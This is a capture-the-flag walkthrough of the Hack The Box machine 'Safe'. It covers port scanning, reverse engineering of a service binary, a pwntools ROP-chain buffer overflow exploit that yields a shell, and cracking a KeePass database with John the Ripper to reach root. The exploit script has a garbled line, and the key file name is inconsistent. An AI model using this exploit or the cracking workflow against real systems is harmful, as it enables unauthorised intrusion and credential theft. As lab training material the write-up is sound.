# Safe Writeup w/o Metasploit

![](https://miro.medium.com/proxy/1*ZbaFs9qUnH1qURWugeKUbA.png)

## Reconnaissance <a id="f781"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.147 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.147Host is likely running Linux---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-08 12:56 EST
Nmap scan report for 10.10.10.147
Host is up (0.037s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh                                                                                                                                                               
80/tcp open  http                                                                                                                                                              
                                                                                                                                                                               
Nmap done: 1 IP address (1 host up) scanned in 1.04 seconds                                                                                                                    
                                                                                                                                                                                                                                                                                                                                                          
                                                                                                                                                                               
---------------------Starting Nmap Basic Scan---------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-08 12:56 EST
Nmap scan report for 10.10.10.147
Host is up (0.047s latency).PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.75 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-08 12:56 EST
Warning: 10.10.10.147 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.147
Host is up (0.034s latency).
All 1000 scanned ports on 10.10.10.147 are open|filtered (978) or closed (22)Nmap done: 1 IP address (1 host up) scanned in 16.74 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-08 12:56 EST
Initiating Parallel DNS resolution of 1 host. at 12:56
Completed Parallel DNS resolution of 1 host. at 12:56, 0.02s elapsed
Initiating SYN Stealth Scan at 12:56
Scanning 10.10.10.147 [65535 ports]
....
Nmap scan report for 10.10.10.147
Host is up (0.034s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  wasteMaking a script scan on extra ports: 1337
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-08 12:58 EST
Nmap scan report for 10.10.10.147
Host is up (0.033s latency).PORT     STATE SERVICE VERSION
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     13:01:02 up 4 min, 0 users, load average: 0.01, 0.06, 0.02
|   DNSVersionBindReqTCP: 
|     13:00:57 up 4 min, 0 users, load average: 0.01, 0.06, 0.02
|   GenericLines: 
|     13:00:45 up 4 min, 0 users, load average: 0.01, 0.06, 0.03
|     What do you want me to echo back?
|   GetRequest: 
|     13:00:51 up 4 min, 0 users, load average: 0.01, 0.06, 0.03
|     What do you want me to echo back? GET / HTTP/1.0
|   HTTPOptions: 
|     13:00:51 up 4 min, 0 users, load average: 0.01, 0.06, 0.03
|     What do you want me to echo back? OPTIONS / HTTP/1.0
|   Help: 
|     13:01:07 up 4 min, 0 users, load average: 0.01, 0.06, 0.02
|     What do you want me to echo back? HELP
|   NULL: 
|     13:00:45 up 4 min, 0 users, load average: 0.01, 0.06, 0.03
|   RPCCheck: 
|     13:00:52 up 4 min, 0 users, load average: 0.01, 0.06, 0.03
|   RTSPRequest: 
|     13:00:52 up 4 min, 0 users, load average: 0.01, 0.06, 0.03
|     What do you want me to echo back? OPTIONS / RTSP/1.0
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     13:01:07 up 4 min, 0 users, load average: 0.01, 0.06, 0.02
|_    What do you want me to echo back?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
....Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.54 seconds---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                                               
Running CVE scan on all ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-08 13:00 EST
Nmap scan report for 10.10.10.147
Host is up (0.028s latency).PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
....
1337/tcp open  waste?
....
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.24 secondsRunning Vuln scan on all ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-08 13:02 EST
Nmap scan report for 10.10.10.147
Host is up (0.030s latency).PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.147
....
1337/tcp open  waste?
....
1 service unrecognized despite returning data.
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.95 seconds---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                                                                                                               
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.147:80 -o recon/gobuster_10.10.10.147_80.txt
nikto -host 10.10.10.147:80 | tee recon/nikto_10.10.10.147_80.txtWhich commands would you like to run?                                                                                                                                          
All (Default), gobuster, nikto, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                                                                                                               
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.147:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/08 13:04:47 Starting gobuster
===============================================================
http://10.10.10.147:80/.htaccess (Status: 403) [Size: 296]
http://10.10.10.147:80/.htaccess.html (Status: 403) [Size: 301]
http://10.10.10.147:80/.htaccess.php (Status: 403) [Size: 300]
http://10.10.10.147:80/.hta (Status: 403) [Size: 291]
http://10.10.10.147:80/.hta.html (Status: 403) [Size: 296]
http://10.10.10.147:80/.hta.php (Status: 403) [Size: 295]
http://10.10.10.147:80/.htpasswd (Status: 403) [Size: 296]
http://10.10.10.147:80/.htpasswd.html (Status: 403) [Size: 301]
http://10.10.10.147:80/.htpasswd.php (Status: 403) [Size: 300]
http://10.10.10.147:80/index.html (Status: 200) [Size: 10787]
http://10.10.10.147:80/index.html (Status: 200) [Size: 10787]
http://10.10.10.147:80/manual (Status: 301) [Size: 313]
http://10.10.10.147:80/server-status (Status: 403) [Size: 300]
===============================================================
2020/02/08 13:05:24 Finished
===============================================================Finished gobuster scan
                                                                                                                                                                            
=========================
                                                                                                                                                                            
Starting nikto scan
                                                                                                                                                                            
- Nikto v2.1.6
--------------------------------------------------------------------
+ Target IP:          10.10.10.147
+ Target Hostname:    10.10.10.147
+ Target Port:        80
+ Start Time:         2020-02-08 13:05:26 (GMT-5)
--------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2a23, size: 588c4cc4e54b5, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7863 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2020-02-08 13:10:37 (GMT-5) (311 seconds)
--------------------------------------------------------------------
+ 1 host(s) testedFinished nikto scan
                                                                                                                                                                            
=========================
                                                                                                                                                                            
                                                                                                                                                                            
                                                                                                                                                                            
---------------------Finished all Nmap scans---------------------Completed in 14 minute(s) and 21 second(s)
```

We have three ports open.

* **Port 80:** running Apache httpd 2.4.25
* **Port 22:** running OpenSSH 7.4p1
* **Port 1337:** running a service that nmap was not able to recognize

Before we move on to enumeration, let’s make some mental notes about the scan results.

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* Port 80 is running Apache httpd 2.4.25 and the nmap scan found the _index.html_ page and got a redirect on the _manual_ directory.
* The service running on port 1337 was not recognized by nmap. However, the nmap results show that we can interact with the service and get data back. So we’ll use netcat to connect to the service and figure out what it is doing.

## Enumeration <a id="c516"></a>

I always start off with enumerating HTTP.

**Port 80**

Visit the application in the browser.

![](https://miro.medium.com/max/1115/1*dByNY0h6_yO3uYteO1lg4Q.png)

We get the default Apache welcome page. This might be a virtual hosts configuration issue where the IP address doesn’t know what hostname it should map to in order to serve a specific site and so instead it’s serving the Apache2 ubuntu default page.

The nmap scan did not leak any domain name information. So let’s try and get that using nslookup.

```text
root@kali:~# nslookup
> server 10.10.10.147
Default server: 10.10.10.147
Address: 10.10.10.147#53
> 10.10.10.147
```

We get nothing. Next, I’m going to edit the _/etc/hosts_ file and add the default naming convention for HTB boxes.

```text
10.10.10.147    safe.htb
```

Visit the application using the domain name.

![](https://miro.medium.com/max/1143/1*KIF0bdQ-IR-1W7TEsCfWPw.png)

We still get the Apache2 default page. So this is not a virtual hosts configuration issue. Next, let’s try and view the page source to see if it leaks any information.

![](https://miro.medium.com/max/964/1*c1_QfbKIC2Vkgrm0VMyC4A.png)

It tells us that the application running on port 1337 can be downloaded from this web server. Let’s navigate to the _/myapp_ directory path to download the application.

Next, determine the file type of _myapp_.

```text
root@kali:~/Desktop/htb/safe# file myapp
                                                                                                                                
myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped
```

It’s a 64 bit executable file. Let’s load it up in [Ghidra](https://executeatwill.com/2019/04/04/Install-Ghidra-on-Kali-Linux/) and analyze the code. In Ghidra under the symbol tree, click on _Functions_ folder and select _main_.

![](https://miro.medium.com/max/606/1*xSxCJGJcioKFvot9NJ_X_A.png)

Here’s a summary of what the program does:

* Takes in an input of 112 bytes and saves it into the variable local\_78
* Runs the uptime command that tells us how long the system has been running
* Prints the string “What do you want me to echo back?”
* Reads characters from the standard input using the gets\(\) function and stores them as a C string until a newline character or the end-of-file is reached. The gets\(\) function does not check the maximum limit of input characters, so this is likely vulnerable to a buffer overflow.
* Writes a string to stdout using the puts\(\) function.

Since the application appears to be vulnerable to a buffer overflow, we’ll try and gain initial access by exploiting this vulnerability.

## Initial Foothold <a id="6810"></a>

We’ll develop our exploit locally and then we’ll change the script to run on the _Safe_ box. There are several steps you need to take in order to exploit a buffer overflow vulnerability and these steps can slightly change based on the OS and security protections that are enabled on the application.

My method of exploitation will be done using [GDB](https://www.gnu.org/software/gdb/) and [GEF](https://gef.readthedocs.io/en/master/).

**Note:** This is a difficult topic to explain, especially if you’ve never seen it before. The articles that helped me solve this machine are listed in the _Resources_ ****section at the end of this blog.

Alright, back to exploiting the buffer overflow vulnerability.

**Step \#1: Crash the application**

The first step is to prove that the application is vulnerable to a buffer overflow. This can be done by sending a large number of characters as an argument to the application until it crashes. This is known as fuzzing.

Run the binary using GDB.

![](https://miro.medium.com/max/666/1*5aW76_XUDC3_N6CZlz-axw.png)

As can be seen in the above image, if we enter the input “_hello_” the application responds with the output “_hello_” and exists normally.

Since the buffer is set to 112 bytes, we’ll need to use a number of characters larger than a 112. Let’s go with 200. Use python to generate a string of 200 As.

```text
root@kali:~/Desktop/htb/safe# python -c 'print "A"*200'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Go back to the GDB terminal and run the program again with the above input.

![](https://miro.medium.com/max/1028/1*0CFfSyur5Ac-CnK0_ZQv-Q.png)

We get a segmentation error. This is the expected behaviour for applications vulnerable to buffer overflow. However, notice that we didn’t overwrite the RIP \(which is equivalent to EIP for 32-bit\). As mentioned in the referenced articles, the maximum address size is 0x00007FFFFFFFFFFF. Whereas, we’re overwriting the RIP with a non-canonical address of 0x4141414141414141 which causes an exception to be raised. So what we really need to do is first find the offset and then overwrite the RIP with a canonical address.

**Step \#2: Find the offset**

Use **pattern create** to generate a cyclical string of 200 characters.

```text
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Saved as '$_gef0'
```

Now perform step \#1 again with the above string. We get a segmentation error.

![](https://miro.medium.com/max/919/1*osC3jSfX7mdBE1zUGB8ZfQ.png)

Find the offset.

```text
gef➤  pattern search paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava
[+] Searching 'paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava'
[+] Found at offset 120 (big-endian search)
```

The offset is 120 bytes which means that after 120 bytes we can overwrite the RIP.

**Step \#3: Determine the security protections that are enabled on the application**

This can be done using the “_checksec_” command.

![](https://miro.medium.com/max/728/1*nkMcvDBH2VYyD61PBj5egg.png)

We can see that NX/DEP is enabled, which means that the stack is read only / non-executable. So unlike the [Jail box buffer overflow vulnerability](https://medium.com/@ranakhalil101/hack-the-box-jail-writeup-w-o-metasploit-c0601ed7b947), we won’t be able to execute shell code on the stack. Moreover, this is a 64-bit binary, where function parameters are passed in registers \(the first being RDI, the second being RSI and the third being RDX\) so we’ll need to develop what is known as a Return Oriented Programming \(ROP\) chain exploit.

**Step \#4: Collect all the necessary parameters for a ROP chain exploit**

The first thing to do is list the functions in the application.

![](https://miro.medium.com/max/575/1*2lGpN9ll-iwjZtypHQVKdg.png)

Next, use the disassemble command to view what the _main_ function does.

![](https://miro.medium.com/max/883/1*RIBxlvbMb_KouviQbNSbKw.png)

Similarly, do the same for the _test_ function.

![](https://miro.medium.com/max/583/1*-C50ikq1QgQO901stJeOHA.png)

The exploit we plan on running, returns to the _system\(\)_ function and executes _/bin/sh_. Therefore, we need a few things:

* The address of _system\(\)_. We saw using the _checksec_ command that ASLR/PIE is disabled so we don’t have to worry about this address changing. We saw in the above image that the address is _0x401040_.
* Since the first function argument needs to be in RDI, we need a ROP gadget that will copy “_/bin/sh_” into RDI. We can use the registers in the test function located at _0x401152_, specifically the _“mov rdi, rsp”_ and “_jmp r13”_ instructions.
* The last thing we need is the address to a _“pop r13”_ instruction. This can be found using the ropper command.

```text
0x0000000000401206: pop r13; pop r14; pop r15; ret;
```

**Step \#5: Write out the exploit**

We have all the necessary information we need to write out our exploit. I use pwn tools to automate the process.

```text
from pwn import *# initial configuration
p = process("./myapp")
context(os="linux", arch="amd64")# parameters
junk = "A" * 112 # offset - 8
cmd = "/bin/sh\x00" # argument that will be passed to RPB
pop_r13 = p64(0x401206) # pop r13
random = p64(0x000000) # random value that will be put into r14 and r15
mov_rsp_to_rdi = p64(0x401152) # mv rdi, rsp
system = p64(0x401040)# buffer
buf = junk + cmd #get to the RBP and pass the /bin/sh string
buf += pop_r13 # pop r13
buf += system # set r13 to system call
buf += random + random # pop r14, pop r15 
buf += mov_rsp_to_rdip.recvline()
p.sendline(buf)
p.interactive()
```

What the above script does is it pushes the RBP register, which contains the /bin/sh string, on the stack that eventually ends up in the RDI register. Then we use r13 to make the program jump to the system function and run /bin/sh which give us a shell.

Run the exploit and we get a shell!

```text
root@kali:~/Desktop/htb/safe# python safe.py
[+] Starting local process './myapp': pid 4562
[*] Switching to interactive modeWhat do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh
$ id
uid=0(root) gid=0(root) groups=0(root)
```

To test it on the Safe box, make the following changes in the script.

```text
p = remote("10.10.10.147", 1337)                                                                            
#p = process("./myapp")
```

Run the exploit and we get a shell!

```text
root@kali:~/Desktop/htb/safe# python safe-prod.py 
[+] Opening connection to 10.10.10.147 on port 1337: Done
[*] Switching to interactive mode
$ whoami
user
$ hostname
safe
```

Grab the _user.txt_ flag.

![](https://miro.medium.com/max/509/1*R6wC3M03JDcolhPiiuXZow.png)

We need to escalate privileges.

## Privilege Escalation <a id="c279"></a>

View the content of the home directory.

![](https://miro.medium.com/max/1003/1*BQQEwujyRtsFa7IdP6vcKg.png)

We find a KeePass database. Let’s copy everything into our attack machine. The easiest way to do this is through SCP since SSH is open. \(I’ll leave it up to the reader to figure out how to drop an SSH key in the user’s home directory\)

```text
scp -i id_rsa user@10.10.10.147:* .
```

The KeePass database is password protected. In order to crack the password using John the Ripper \(JtR\), we’ll have to extract a JtR compatible hash of the password. This can be done as follows.

```text
keepass2john MyPasswords.kdbx > hash.txt
```

Then run JtR on the hash.

```text
john --format=KeePass -w /usr/share/wordlists/rockyou.txt hash.txt
```

It doesn’t crack the password. It is possible that they’re using a key file. Since the directory did have a bunch of images, one of these images can be the key file.

```text
for i in *.JPG; do echo "*******Key File: $i"; keepass2john -k $i MyPasswords.kdbx > new-hashes.txt | john --format=KeePass -w /usr/share/wordlists/rockyou.txt new-hashes.txt; done
```

The above code loops through all the images as key files and generates the hash. Then it passes that hash to JtR. We get back the following result.

![](https://miro.medium.com/max/755/1*ARnNV9K6WCEPzMf1assiTA.png)

The key file is “_IMG\_0567.JPG_” and the password is “_bullshit_”. Now we have all the information we need to open the KeePass database. To do that from the command line, we’ll use the kpcli program.

```text
root@kali:~/Desktop/htb/safe/user-home# kpcli --kdb MyPasswords.kdbx --key IMG_0547.JPG
Please provide the master password: *************************KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.kpcli:/> ls
=== Groups ===
MyPasswords/
kpcli:/> cd MyPasswords/
kpcli:/MyPasswords> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
=== Entries ===
0. Root password
```

View the entry for Root password.

```text
kpcli:/MyPasswords> show -f 0Title: Root password
Uname: root
 Pass: u3v2249dl9ptv465cogl3cnpo3fyhk
  URL: 
Notes:
```

We have a password! Let’s ssh into root.

```text
root@kali:~# ssh root@10.10.10.147
root@10.10.10.147’s password:
```

It doesn’t work, maybe the user is not configured for remote access. Next, let’s try su-ing into root.

```text
user@safe:~$ su -
Password: 
root@safe:~#
```

We’re in! View the _root.txt_ flag.

![](https://miro.medium.com/max/486/1*zt_gSFGiKaklerETbFoxvQ.png)

## Lessons Learned <a id="8c34"></a>

To gain an initial foothold on the box we exploited one vulnerability.

1. Buffer overflow vulnerability. The myapp service being used was vulnerable to a buffer overflow that allowed us to perform a ROP chain exploit and gain access to the box. The root cause of the buffer overflow vulnerability was lack of input validation. The developer should have validated user input.

To escalate privileges we exploited one vulnerability.

1. Weak authentication credentials. After gaining initial access on the box, we found a KeePass database that was protected with a weak password. Clearly, the user is security-aware and therefore is using a KeePass database to store his passwords. However, the password to the database was not strong enough and therefore we were able to crack it in a matter of seconds and gain access to all the other passwords that the user had stored in the database. The user should have used a strong password that is difficult to crack.

